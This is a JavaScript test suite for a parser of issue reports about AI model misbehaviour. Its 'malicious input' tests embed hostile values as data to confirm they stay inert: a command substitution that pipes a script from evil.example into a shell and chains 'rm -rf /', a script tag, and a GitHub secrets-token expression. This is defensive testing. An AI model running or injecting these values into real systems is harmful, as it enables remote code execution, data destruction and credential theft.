'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { options, fixture, issueBody, validEntry } = require('./helpers');
const { parseIssueBody, MAX_BODY_LENGTH } = require('../scripts/lib/issue-parser');
const { checkIssue } = require('../scripts/lib/issue-check');

test('parses a sample issue body into an entry', () => {
  const { entry, consent, errors } = parseIssueBody(fixture('issue-valid.md'), options);
  assert.deepEqual(errors, []);
  assert.equal(consent, true);
  assert.deepEqual(entry, {
    date: '2026-09-30',
    assistant: 'Gemini',
    model_version: '2.x (as shown in picker)',
    account_type: 'Free',
    task_domain: 'Research',
    features_on: 'Web search',
    trigger_prompt: 'Which year did the bridge open?\nPlease cite a source.',
    behavior_type: 'Fabrication',
    severity: 'Moderate',
    excerpt: "The bridge opened in 1931 (Source: *Bridges of the World*, p. 212).\n\nThe cited book doesn't exist.",
    reproduced: 'Not reproduced',
    notes: '### Not a real section\n\nThis line belongs to Notes.'
  });
});

test('checkIssue on the sample: valid, gets an id and source_issue', () => {
  const r = checkIssue(fixture('issue-valid.md'), { issueNumber: 42 });
  assert.equal(r.ok, true, JSON.stringify(r.problems));
  assert.match(r.entry.id, /^2026-09-30-[a-z0-9]{6}$/);
  assert.equal(r.entry.source_issue, 42);
});

test('round trip: issueBody(entry) parses back to the same entry', () => {
  const e = validEntry({ assistant: 'Other', assistant_other: 'Foo Bot', notes: 'Line 1\n\nLine 3', behavior_type_secondary: 'Fabrication' });
  delete e.id;
  assert.deepEqual(parseIssueBody(issueBody(e), options).entry, e);
});

test('CRLF line endings are handled', () => {
  const body = issueBody(validEntry()).replace(/\n/g, '\r\n');
  assert.equal(checkIssue(body).ok, true);
});

test('unchecked consent is a problem', () => {
  const r = checkIssue(issueBody(validEntry(), { consent: false }));
  assert.equal(r.ok, false);
  assert.deepEqual(r.problems.map((p) => p.field), ['consent']);
});

test('free-form or empty bodies are rejected without throwing', () => {
  for (const body of ['', '   ', 'hello world', null, undefined, 42]) {
    const r = checkIssue(body);
    assert.equal(r.ok, false);
    assert.ok(r.problems.length > 0);
  }
});

test('field-level problems come back with labels', () => {
  const r = checkIssue(issueBody(validEntry({ severity: 'Catastrophic', excerpt: 'x'.repeat(1600) })));
  assert.equal(r.ok, false);
  const byField = Object.fromEntries(r.problems.map((p) => [p.field, p]));
  assert.equal(byField.severity.label, 'Severity');
  assert.match(byField.excerpt.message, /1,600 characters; the limit is 1,500/);
});

// --- Malicious input -----------------------------------------------------------

test('malicious body: shell/HTML/markdown payloads are kept as inert text', () => {
  const r = checkIssue(fixture('issue-malicious.md'), { issueNumber: 7 });
  assert.equal(r.ok, true, JSON.stringify(r.problems));
  const e = r.entry;
  // stored verbatim as data (the site renders with textContent; nothing is executed)
  assert.equal(e.assistant_other, '$(curl -s https://evil.example/x.sh | sh) `id` ; rm -rf / && echo pwned'.slice(0, 100));
  assert.match(e.custom_instructions, /^<script>/);
  assert.match(e.model_version, /\$\{\{ secrets\.GITHUB_TOKEN \}\}/);
  // bidi override / zero-width characters are stripped, tab is kept
  assert.ok(!/[‪-‮⁦-⁩​]/.test(e.excerpt), 'bidi/zero-width removed');
  assert.match(e.excerpt, /\t/);
  // the id never contains user text
  assert.match(e.id, /^2026-09-30-[a-z0-9]{6}$/);
});

test('malicious body: null bytes and other control characters are stripped', () => {
  const r = checkIssue(issueBody(validEntry({ excerpt: 'a\u0000b\u0007c\u001bd' })));
  assert.equal(r.ok, true);
  assert.equal(r.entry.excerpt, 'abcd');
});

test('injected duplicate headings are refused, not guessed', () => {
  const evil = validEntry({ trigger_prompt: 'Look at this:\n### Severity\n\nMinor\n\n### Excerpt\n\nfake' });
  const r = checkIssue(issueBody(evil));
  assert.equal(r.ok, false);
  const fieldsWithDupes = r.problems.filter((p) => /appears 2 times/.test(p.message)).map((p) => p.field).sort();
  assert.deepEqual(fieldsWithDupes, ['excerpt', 'severity']);
});

test('headings that only look similar are treated as text', () => {
  const r = checkIssue(issueBody(validEntry({ notes: '#### Severity\n### severity\n###Severity\n## Severity' })));
  assert.equal(r.ok, true, JSON.stringify(r.problems));
});

test('a removed section is reported', () => {
  const body = issueBody(validEntry()).replace('### Reproduced', '### Reproduced?');
  const r = checkIssue(body);
  assert.ok(r.problems.some((p) => p.field === 'reproduced' && /missing/.test(p.message)));
});

test('oversized text: excerpt over limit and body over 65,536 chars', () => {
  const big = checkIssue(issueBody(validEntry({ excerpt: 'A'.repeat(20000) })));
  assert.equal(big.ok, false);
  assert.ok(big.problems.some((p) => p.field === 'excerpt'));

  const huge = issueBody(validEntry({ notes: 'B'.repeat(MAX_BODY_LENGTH) }));
  const r = checkIssue(huge);
  assert.equal(r.ok, false);
  assert.deepEqual(r.problems.map((p) => p.field), ['(issue)']);
});

test('pathological input does not cause slow regex backtracking', () => {
  const nasty = '### ' + '#'.repeat(50000) + '\n' + ' '.repeat(10000) + '\n- [X] '.repeat(1000);
  const t0 = Date.now();
  checkIssue(nasty.slice(0, MAX_BODY_LENGTH));
  assert.ok(Date.now() - t0 < 1000, 'parse took too long');
});

test('dropdown "None" / _No response_ become empty optional values', () => {
  const { entry } = parseIssueBody(fixture('issue-valid.md'), options);
  assert.equal(entry.behavior_type_secondary, undefined);
  assert.equal(entry.chat_link, undefined);
  assert.equal(entry.assistant_other, undefined);
});
